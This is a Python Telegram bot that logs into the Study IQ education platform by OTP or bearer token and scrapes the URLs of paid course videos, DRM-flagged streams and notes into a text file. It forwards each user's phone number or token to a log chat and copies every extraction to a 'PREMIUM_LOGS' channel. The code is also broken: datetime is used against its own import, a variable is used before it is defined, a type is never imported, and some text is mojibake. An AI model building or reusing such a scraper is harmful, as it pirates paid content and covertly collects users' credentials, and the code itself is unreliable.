import requests 
import datetime, pytz, re, aiofiles, subprocess, os, base64, io
import aiohttp
import aiofiles
import os
import server 
from pyrogram import Client
from pyrogram import filters
from Extractor import app
from config import PREMIUM_LOGS, join
from datetime import datetime
import pytz
from Extractor.core.utils import forward_to_log


async def fetchs(url, json=None, headers=None):
    async with aiohttp.ClientSession() as session:
        async with session.post(url, json=json, headers=headers) as response:
            return await response.json()

async def login(app, m, all_urls, start_time, bname, batch_id, app_name, price=None, start_date=None, imageUrl=None):
    bname = await sanitize_bname(bname)
    file_path = f"{bname}.txt"
    local_time = datetime.datetime.now(pytz.timezone('Asia/Kolkata'))
    end_time = datetime.datetime.now()
    duration = end_time - start_time
    minutes, seconds = divmod(duration.total_seconds(), 60)
    
    # Count content types
    all_text = "\n".join(all_urls)
    video_count = len(re.findall(r'\.(m3u8|mpd|mp4)', all_text))
    pdf_count = len(re.findall(r'\.pdf', all_text))
    drm_count = len(re.findall(r'\.(videoid|mpd|testbook)', all_text))
    doc_count = len(re.findall(r'\.(doc|docx|ppt|pptx)', all_text))
    
    # Format according to theme.md
    caption = (
        f"🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
        f"📱 <b>APP:</b> Study IQ\n"
        f"📚 <b>BATCH:</b> {bname} (ID: {batch_id})\n"
        f"⏱ <b>EXTRACTION TIME:</b> {int(minutes):02d}:{int(seconds):02d}\n"
        f"📅 <b>DATE:</b> {local_time.strftime('%d-%m-%Y %H:%M:%S')} IST\n\n"
        f"📊 <b>CONTENT STATS</b>\n"
        f"├─ 📁 Total Links: {len(all_urls)}\n"
        f"├─ 🎬 Videos: {video_count}\n"
        f"├─ 📄 PDFs: {pdf_count}\n"
        f"├─ 📑 Documents: {doc_count}\n"
        f"└─ 🔐 Protected: {drm_count}\n\n"
        f"🚀 <b>Extracted by:</b> @{(await app.get_me()).username}\n\n"
        f"<code>╾───• @PRO_TXT_EXTRATOR_BOT •───╼</code>"
    )
    
    async with aiofiles.open(file_path, 'w', encoding='utf-8') as f:
        await f.writelines([url + '\n' for url in all_urls])
    copy = await m.reply_document(document=file_path, caption=caption, parse_mode="html")
    await app.send_document(PREMIUM_LOGS, file_path, caption=caption, parse_mode="html")

async def sanitize_bname(bname, max_length=50):
    bname = re.sub(r'[\\/:*?"<>|\t\n\r]+', '', bname).strip()
    if len(bname) > max_length:
        bname = bname[:max_length]
    return bname

@app.on_message(filters.command(["iq"]))
async def handle_iq_logic(app, m):
    try:
        # Initial login message
        editable = await m.reply_text(
            "🔹 <b>STUDY IQ EXTRACTOR PRO</b> 🔹\n\n"
            "Send your <b>Phone Number</b> to login\n"
            "Or directly use your saved <b>Token</b>\n\n"
            "📱 <b>Phone:</b> <code>10-digit number</code>\n"
            "🔑 <b>Token:</b> <code>your_saved_token</code>\n\n"
            "<i>Example:</i>\n"
            "Phone: <code>9876543210</code>\n"
            "Token: <code>eyJhbGciOiJ...</code>\n\n"
            "💡 <i>Use token to login instantly without OTP</i>"
        )

        input1: Message = await app.listen(chat_id=m.chat.id)
        # After getting user response
        await forward_to_log(input1, "Study IQ Extractor")
        await input1.delete()
        raw_text1 = input1.text.strip()
        logged_in = False

        if raw_text1.isdigit():
            # Phone number login
            phNum = raw_text1.strip()
            master0 = await fetchs(f"https://www.studyiq.net/api/web/userlogin", json={"mobile": phNum})
            msg = master0.get('msg')
            
            if master0['data']:
                user_id = master0.get('data', {}).get('user_id')
                await editable.edit_text(
                    "✅ <b>OTP Sent Successfully</b>\n\n"
                    f"📱 Phone: <code>{phNum}</code>\n"
                    "📬 Please check your messages and send the OTP"
                )
            else:
                await editable.edit_text(
                    "❌ <b>Login Failed</b>\n\n"
                    f"Error: {msg}\n\n"
                    "Please check your number and try again."
                )
                return
        
            input2 = await app.listen(chat_id=m.chat.id)
            raw_text2 = input2.text.strip()
            otp = raw_text2
            await input2.delete()
            
            data = {
                "user_id": user_id,
                "otp": otp
            }

            master1 = await fetchs(f"https://www.studyiq.net/api/web/web_user_login", json=data)
            msg = master1.get('msg')
            
            if master1['data']:  
                token = master1.get('data', {}).get('api_token')
                if token:
                    await editable.edit_text(
                        "✅ <b>Login Successful</b>\n\n"
                        f"🔑 Your Access Token:\n<code>{token}</code>\n\n"
                        "<i>Save this token for future logins</i>"
                    )
                    logged_in = True
                else:
                    await editable.edit_text(
                        "❌ <b>Login Failed</b>\n\n"
                        f"Error: {msg}\n\n"
                        "Please try again with correct OTP."
                    )
                    return
        else:
            token = raw_text1.strip()
            logged_in = True

        if logged_in:
            headers = {
                "Authorization": f"Bearer {token}",
            }
            
            # Fetch courses
            json_master2 = server.get("https://backend.studyiq.net/app-content-ws/api/v1/getAllPurchasedCourses?source=WEB", headers=headers)
            
            if not json_master2['data']:
                await editable.edit_text(
                    "❌ <b>No Batches Found</b>\n\n"
                    "You don't have any paid or free batches available."
                )
                return

            # Format batch information
            Batch_ids = []
            batch_text = ""
            
            for course in json_master2["data"]:
                batch_id = course['courseId']
                name = course['courseTitle']
                batch_text += f"<code>{batch_id}</code> - <b>{name}</b> 💰\n\n"
                Batch_ids.append(str(batch_id))

            # Show available batches
            await editable.edit_text(
                f"✅ <b>Login Successful!</b>\n\n"
                f"📚 <b>Available Batches:</b>\n\n{batch_text}"
            )

            # Ask for batch selection
            Batch_ids_str = '&'.join(Batch_ids)
            editable1 = await m.reply_text(
                "<b>📥 Send the Batch ID to download</b>\n\n"
                f"<b>💡 For ALL batches:</b> <code>{Batch_ids_str}</code>\n\n"
                "<i>Supports multiple IDs separated by '&'</i>"
            )

            input4 = await app.listen(chat_id=m.chat.id)
            await input4.delete()
            await editable.delete()
            await editable1.delete()

            if "&" in input4.text:
                batch_ids = input4.text.split('&')
            else:
                batch_ids = [input4.text]

            for batch_id in batch_ids:
                start_time = datetime.datetime.now()
                progress_msg = await m.reply_text(
                    "🔄 <b>Processing Large Batch</b>\n"
                    f"└─ Initializing batch: <code>{batch_id}</code>"
                )

                if batch_id:
                    master3 = server.get(f"https://backend.studyiq.net/app-content-ws/v1/course/getDetails?courseId={batch_id}&languageId=", headers=headers)
                    bname = master3.get("courseTitle", "").replace(' || ', '').replace('|', '')
                    
                    if not bname:
                        await progress_msg.edit_text("❌ <b>Invalid batch ID or batch not found</b>")
                        continue

                    all_urls = []
                    T_slug = "&".join([str(item.get("contentId")) for item in master3['data']])
                    content_id = T_slug.split('&')

                    for t_id in content_id:
                        topicname = next((x.get('name') for x in master3['data'] if x.get('contentId') == int(t_id)), None)
                        try:
                            await progress_msg.edit(f"(ðŸ‘‰ï¾Ÿãƒ®ï¾Ÿ)ðŸ‘‰**Url writing in process -** `{topicname}`")
                        except Exception as e:
                            print(f"Error occurred while editing topic name: {e}")

                        parent_data = server.get(f"https://backend.studyiq.net/app-content-ws/v1/course/getDetails?courseId={batch_id}&languageId=&parentId={t_id}", headers=headers)
                        subFolderOrderId = [item.get("subFolderOrderId") for item in parent_data['data']]

                        if all(sub_folder_order_id is None for sub_folder_order_id in subFolderOrderId):
                            for video_item in video['data']:
                                url = video_item.get('videoUrl')
                                name = video_item.get('name')
                                if url is not None:
                                    if url.endswith(".mpd"):
                                        cc = f"[{topicname}]-{name}:{url}"
                                    else:
                                        cc = f"[{topicname}]-{name}:{url}"
                                    
                                    all_urls.append(cc)
                                contentIdy = video_item.get('contentId')
                                response = await fetchs(f"https://backend.studyiq.net/app-content-ws/api/lesson/data?lesson_id={contentIdy}&courseId={batch_id}", headers=headers)
                                for option in response['options']:
                                    if option.get('urls'):
                                        for url_data in option['urls']:
                                            if 'name' in url_data:
                                                name = url_data['name']
                                                url = url_data['url']
                                                cc = f"[Notes] - {name}: {url}"
                                            
                                                all_urls.append(cc)

                        else:
                            T_slug = "&".join([str(item.get("contentId")) for item in parent_data['data']])
                            content_idx = T_slug.split('&')

                            for p_id in content_idx:
                                course_title = next((x.get('name') for x in parent_data['data'] if x.get('contentId') == int(p_id)), None)
                                video = server.get(f"https://backend.studyiq.net/app-content-ws/v1/course/getDetails?courseId={batch_id}&languageId=&parentId={t_id}/{p_id}", headers=headers)
                                for video_item in video['data']:
                                    url = video_item.get('videoUrl')
                                    name = video_item.get('name')
                                    if url is not None:
                                        if url.endswith(".mpd"):
                                            cc = f"[{course_title}]-{name}:{url}"
                                        else:
                                            cc = f"[{course_title}]-{name}:{url}"
                                    
                                        all_urls.append(cc)
                                    contentIdx = video_item.get('contentId')
                                    response = await fetchs(f"https://backend.studyiq.net/app-content-ws/api/lesson/data?lesson_id={contentIdx}&courseId={batch_id}", headers=headers)
                                    for option in response['options']:
                                        if option.get('urls'):
                                            for url_data in option['urls']:
                                                if 'name' in url_data:
                                                    name = url_data['name']
                                                    url = url_data['url']
                                                    cc = f"[Notes] - {name}: {url}"    
                                                    all_urls.append(cc)
                    await progress_msg.edit('**URL Writing Successfull**')
                    await progress_msg.delete()
                    if all_urls:
                        await login(app, m, all_urls, start_time, bname, batch_id, app_name="Study IQ", price=None, start_date=None, imageUrl=None)
                    else:
                        await progress_msg.edit("**No URLs found**")

    except Exception as e:
        await m.reply_text(
            "❌ <b>An error occurred</b>\n\n"
            f"Error details: <code>{str(e)}</code>\n\n"
            "Please try again or contact support."
        )


    
